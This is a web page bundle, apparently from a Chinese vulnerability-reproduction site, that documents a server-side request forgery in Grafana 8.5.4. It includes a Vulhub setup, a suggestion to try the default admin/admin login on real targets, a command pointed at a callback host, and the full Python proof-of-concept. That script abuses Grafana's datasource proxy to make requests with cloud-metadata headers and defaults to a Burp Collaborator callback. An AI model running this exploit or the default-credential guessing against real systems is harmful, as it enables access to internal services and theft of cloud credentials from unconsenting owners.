import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o as c,c as u,a as s,b as n,d as t,e as o}from"./app-58e4a7d6.js";const i={},l=s("h2",{id:"漏洞描述",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),r=s("p",null,"Grafana是一个开源的度量分析与可视化套件。在其管理后台中存在一个功能，攻击者可以用于向任意地址发送HTTP请求，且支持自定义HTTP Header。",-1),k=s("p",null,"参考链接：",-1),d={href:"https://github.com/RandomRobbieBF/grafana-ssrf",target:"_blank",rel:"noopener noreferrer"},q=o(`<h2 id="漏洞环境" tabindex="-1"><a class="header-anchor" href="#漏洞环境" aria-hidden="true">#</a> 漏洞环境</h2><p>Vulhub执行如下命令启动一个Grafana 8.5.4：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:3000</code>即可查看到管理后台。这个管理后台是不需要登录的，因为Vulhub环境设置了匿名用户的权限：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[auth.anonymous]
enabled = true
org_role = Admin
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在真实场景中，如果你没有权限访问管理界面，可以尝试使用默认账号密码<code>admin</code>和<code>admin</code>，只能能够成功登录后台的用户才能利用这个漏洞。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),v={href:"https://github.com/RandomRobbieBF/grafana-ssrf",target:"_blank",rel:"noopener noreferrer"},g=o(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python grafana-ssrf.py -H http://your-ip:3000 -u http://example.com/attack
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202207051620666.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，反连平台已成功收到了HTTP请求：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202207051622042.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#</span>
<span class="token comment"># Grafana SSRF via promoethus</span>
<span class="token comment">#</span>
<span class="token comment"># Note: SSRF will not follow redirects!</span>
<span class="token comment">#</span>
<span class="token comment"># By @RandomRobbieBF</span>
<span class="token comment"># </span>
<span class="token comment">#</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> re
<span class="token keyword">import</span> os<span class="token punctuation">.</span>path
<span class="token keyword">import</span> json
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>


parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-s&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--session&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span> <span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token string">&quot;9765ac114207245baf67dfd2a5e29f3a&quot;</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Session Cookie Value&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--url&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;http://8t2s8yx5gh5nw0z9bd3atkoprgx6lv.burpcollaborator.net&quot;</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;URL of host to check will need http or https&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-H&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--host&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;http://kubernetes.docker.internal:5000&quot;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Host for Grafana&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-f&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--file&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;urls.txt&quot;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;File of URLS to check SSRF Against&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-U&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--username&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Username for Grafana&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-P&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--password&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Password for Grafana&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-p&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--proxy&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Proxy for debugging&quot;</span><span class="token punctuation">)</span>

args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
ssrf_url <span class="token operator">=</span> args<span class="token punctuation">.</span>url
sessionid <span class="token operator">=</span> args<span class="token punctuation">.</span>session
ghost <span class="token operator">=</span> args<span class="token punctuation">.</span>host
files <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token builtin">file</span>
username <span class="token operator">=</span> args<span class="token punctuation">.</span>username
password <span class="token operator">=</span> args<span class="token punctuation">.</span>password



<span class="token keyword">if</span> args<span class="token punctuation">.</span>proxy<span class="token punctuation">:</span>
	http_proxy <span class="token operator">=</span> args<span class="token punctuation">.</span>proxy
	os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">&#39;HTTP_PROXY&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> http_proxy
	os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">&#39;HTTPS_PROXY&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> http_proxy
            
        
<span class="token keyword">def</span> <span class="token function">create_source</span><span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">,</span>ghost<span class="token punctuation">)</span><span class="token punctuation">:</span>


	rawBody <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;name\\&quot;:\\&quot;SSRF-TESTING\\&quot;,\\&quot;type\\&quot;:\\&quot;prometheus\\&quot;,\\&quot;access\\&quot;:\\&quot;proxy\\&quot;,\\&quot;isDefault\\&quot;:false}&quot;</span>
	headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json, text/plain, */*&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/datasources/new&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;x-grafana-org-id&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;content-type&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;en-US,en;q=0.5&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">}</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;grafana_session&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>sessionid<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">}</span>
	response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/api/datasources&quot;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>rawBody<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	y <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token string">&quot;Data source with same name already exists&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;You will need to manually delete the current source that is named SSRF-TESTING&quot;</span><span class="token punctuation">)</span>
		sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token keyword">elif</span> <span class="token string">&quot;id&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Source Created&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;Error:&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Status code:   %i&quot;</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
		



<span class="token keyword">def</span> <span class="token function">refresh_source</span><span class="token punctuation">(</span>ghost<span class="token punctuation">,</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json, text/plain, */*&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/datasources/edit/6/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;x-grafana-org-id&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;en-US,en;q=0.5&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">}</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;grafana_session&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>sessionid<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">}</span>
	response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/api/datasources/&quot;</span><span class="token operator">+</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Refreshed Sources&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Error:&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Status code:   %i&quot;</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
		delete_source<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">)</span>
		

<span class="token keyword">def</span> <span class="token function">create_ssrf</span><span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">,</span>ghost<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	rawBody <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;id\\&quot;:&quot;</span><span class="token operator">+</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token string">&quot;,\\&quot;orgId\\&quot;:1,\\&quot;name\\&quot;:\\&quot;SSRF-TESTING\\&quot;,\\&quot;type\\&quot;:\\&quot;prometheus\\&quot;,\\&quot;typeLogoUrl\\&quot;:\\&quot;\\&quot;,\\&quot;access\\&quot;:\\&quot;proxy\\&quot;,\\&quot;url\\&quot;:\\&quot;&quot;</span><span class="token operator">+</span>ssrf_url<span class="token operator">+</span><span class="token string">&quot;\\&quot;,\\&quot;password\\&quot;:\\&quot;test\\&quot;,\\&quot;user\\&quot;:\\&quot;test\\&quot;,\\&quot;database\\&quot;:\\&quot;test\\&quot;,\\&quot;basicAuth\\&quot;:false,\\&quot;basicAuthUser\\&quot;:\\&quot;\\&quot;,\\&quot;basicAuthPassword\\&quot;:\\&quot;\\&quot;,\\&quot;withCredentials\\&quot;:false,\\&quot;isDefault\\&quot;:false,\\&quot;jsonData\\&quot;:{\\&quot;tlsSkipVerify\\&quot;:true,\\&quot;httpHeaderName1\\&quot;:\\&quot;Metadata-Flavor\\&quot;,\\&quot;httpHeaderName2\\&quot;:\\&quot;Metadata\\&quot;,\\&quot;httpMethod\\&quot;:\\&quot;GET\\&quot;},\\&quot;secureJsonData\\&quot;:{\\&quot;httpHeaderValue1\\&quot;:\\&quot;Google\\&quot;,\\&quot;httpHeaderValue2\\&quot;:\\&quot;true\\&quot;},\\&quot;version\\&quot;:1,\\&quot;readOnly\\&quot;:false}&quot;</span>
	headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json, text/plain, */*&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/datasources/edit/6/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;x-grafana-org-id&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;content-type&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;en-US,en;q=0.5&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">}</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;grafana_session&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>sessionid<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">}</span>
	response <span class="token operator">=</span> session<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/api/datasources/&quot;</span><span class="token operator">+</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>rawBody<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;SSRF Source Updated&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Error:&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Status code:   %i&quot;</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
		delete_source<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">)</span>
				
	

<span class="token keyword">def</span> <span class="token function">check_ssrf</span><span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
	headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json, text/plain, */*&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/datasources/edit/&quot;</span><span class="token operator">+</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;x-grafana-org-id&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;en-US,en;q=0.5&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;x-grafana-nocache&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;true&quot;</span><span class="token punctuation">}</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;grafana_session&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>sessionid<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">}</span>
	response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/api/datasources/proxy/&quot;</span><span class="token operator">+</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">502</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Status code:   %i&quot;</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Response body:\\n %s&quot;</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
		gghost <span class="token operator">=</span> ghost<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
		sub_addr <span class="token operator">=</span> gghost<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
		text_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>sub_addr<span class="token operator">+</span><span class="token string">&quot;.txt&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span><span class="token punctuation">)</span>
		text_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;SSRF URL: %s\\n&quot;</span> <span class="token operator">%</span> ssrf_url<span class="token punctuation">)</span>
		text_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Status code:   %i\\n&quot;</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
		text_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Response body: %s\\n\\n\\n\\n&quot;</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
		text_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
		delete_source<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Error:&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
		delete_source<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">)</span>




<span class="token keyword">def</span> <span class="token function">delete_source</span><span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">)</span><span class="token punctuation">:</span>

	headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json, text/plain, */*&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/datasources/edit/3/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;x-grafana-org-id&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;en-US,en;q=0.5&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">}</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;grafana_session&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>sessionid<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">}</span>
	response <span class="token operator">=</span> session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/api/datasources/&quot;</span><span class="token operator">+</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token string">&quot;Data source deleted&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Deleted Old SSRF Source&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Error:&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
		sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>



